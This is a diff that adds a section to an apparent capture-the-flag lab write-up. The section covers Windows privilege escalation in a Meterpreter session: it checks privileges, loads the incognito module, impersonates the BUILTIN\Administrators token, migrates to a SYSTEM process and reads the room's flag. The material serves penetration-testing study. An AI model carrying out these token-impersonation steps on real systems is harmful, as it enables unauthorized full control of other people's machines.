@@ -138,7 +138,67 @@ Moments after we got a shell on the meterpreter session:
 
 ![image](https://user-images.githubusercontent.com/76821053/131249265-80c1e8fb-2b93-49ee-883b-9b56e565f3c6.png)
 
+If you want to change the meterpreter shell to a regular one you can just type "shell". And, to back out just type "exit".
 
+Before we can actually take full control of the system we can check what privileges the current user has:
+
+```
+whoami /priv
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131886602-0fc697f7-5ca3-4df8-894a-f08e82f7f6af.png)
+
+If we look closely there are two important privileges (SeDebugPrivilege and SeImpersonatePrivilege) enabled. And by using a module call "incognito" we can take advantage of this privileges and privesc vertically to NT Authority.
+
+To load a module just use:
+
+```
+load incognito
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131887372-becfb5c2-539a-4afa-a0f1-cd01bace22bd.png)
+
+Now we need to check what tokens are available and use the a function called "impersonate_token" command to impersonate the Administrators token:
+
+```
+list_tokens -g
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131887656-15e5862a-4355-4821-8c80-5b759401133d.png)
+
+Since "BUILTIN\Administrators" token is available we just need to impersonate it:
+
+```
+impersonate_token "BUILTIN\Administrators"
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131887920-d1ce7a11-bb96-4fd8-8da4-495be871f94f.png)
+
+Success we are now "NT Authority\System"!
+
+We have to ensure that we migrate our process to a process with correct permissions where the process is running by "NT Authority\System":
+
+To list processes:
+
+```
+ps
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131888441-6f8e19e1-3c4f-44c1-8bbf-1852f2a38ad8.png)
+
+Migrating to a different process:
+
+```
+migrate 668
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131888518-ecc9cad4-06ac-432b-b450-5c4d607001d5.png)
+
+Now that we currently have the right process and permissions we can read the final flag of the room.
+
+The flag is at "C:\Windows\System32\config":
+
+![image](https://user-images.githubusercontent.com/76821053/131888701-f366c4ac-635b-45f3-af90-413fc6cff4cd.png)
 
 
 
